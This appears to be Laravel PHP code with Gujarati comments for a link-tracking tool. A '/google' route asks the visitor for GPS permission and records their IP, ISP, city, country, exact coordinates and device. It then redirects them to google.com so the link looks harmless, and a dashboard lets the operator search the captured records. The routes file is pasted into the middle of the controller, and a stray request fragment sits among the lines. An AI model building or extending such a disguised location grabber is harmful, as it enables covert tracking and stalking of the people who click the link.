<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Stevebauman\Location\Facades\Location;

class TrackController extends Controller
{
    // ૧. યુઝરને GPS પરમિશન પેજ પર મોકલવા માટે
    public function track(Request $request)
    {
        return view('tracking_page');
    }

    // ૨. સચોટ GPS લોકેશન અને બાકીનો ડેટા સેવ કરવા માટે
    public function saveExactLocation(Request $request)
    {
        // IP મેળવો
        $ip = $request->header('X-Forwarded-For')
            ? explode(',', $request->header('X-Forwarded-For'))[0]
            : $request->ip();

        // City/Country માટે (બેકઅપ)
        $locationData = Location::get(trim($ip));
<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\TrackController;

// મેઈન પેજ
Route::get('/', function () {
    return "App Working";
});

// ટ્રેકિંગ માટેનો રૂટ (ગૂગલ પર રીડાયરેક્ટ કરશે)
Route::get('/google', [TrackController::class, 'track'])->name('track');

// ડેશબોર્ડ રૂટ (ડેટા જોવા અને સર્ચ કરવા માટે)
Route::get('/dashboard', [TrackController::class, 'dashboard'])->name('dashboard');

// સિંગલ રેકોર્ડ ડિલીટ કરવા માટે
Route::delete('/click/delete/{id}', [TrackController::class, 'destroy'])->name('click.delete');

// બધો જ ડેટા એકસાથે ડિલીટ કરવા માટે
// ખાતરી કરજો કે Blade માં {{ route('clicks.deleteall') }} જ લખ્યું હોય
Route::delete('/clicks/delete-all', [TrackController::class, 'destroyAll'])->name('clicks.deleteall');    aama step 3 update
        // ISP મેળવવા માટે API
        $ispName = 'Unknown';
        try {
            $apiUrl = "http://ip-api.com/json/" . trim($ip) . "?fields=isp";
            $response = @file_get_contents($apiUrl);
            $json = json_decode($response);
            if ($json && isset($json->isp)) {
                $ispName = $json->isp;
            }
        } catch (\Exception $e) {
            $ispName = 'Unknown';
        }

        // ડેટાબેઝમાં એન્ટ્રી (GPS ડેટા પ્રાથમિકતા આપશે)
        DB::table('clicks')->insert([
            'ip'         => trim($ip),
            'device'     => $request->header('User-Agent'),
            'isp'        => $ispName,
            'city'       => $locationData ? ($locationData->cityName ?? 'Unknown') : 'Unknown',
            'country'    => $locationData ? ($locationData->countryName ?? 'Unknown') : 'Unknown',
            'latitude'   => $request->lat ?? ($locationData ? $locationData->latitude : null),
            'longitude'  => $request->lng ?? ($locationData ? $locationData->longitude : null),
            'clicked_at' => now(),
            'created_at' => now(),
            'updated_at' => now(),
        ]);

        return redirect('https://google.com');
    }

    public function dashboard(Request $request)
    {
        $search = $request->input('search');
        $query = DB::table('clicks');

        if (!empty($search)) {
            $query->where(function($q) use ($search) {
                $q->where('ip', 'LIKE', "%$search%")
                  ->orWhere('city', 'LIKE', "%$search%")
                  ->orWhere('country', 'LIKE', "%$search%")
                  ->orWhere('isp', 'LIKE', "%$search%"); 
            });
        }

        $data = $query->orderBy('clicked_at', 'desc')->get();
        return view('dashboard', compact('data'));
    }

    public function destroy($id)
    {
        DB::table('clicks')->where('id', $id)->delete();
        return back()->with('success', 'રેકોર્ડ ડિલીટ થઈ ગયો!');
    }

    public function destroyAll()
    {
        DB::table('clicks')->delete(); 
        return back()->with('success', 'બધો જ ડેટા ડિલીટ થઈ ગયો!');
    }
}
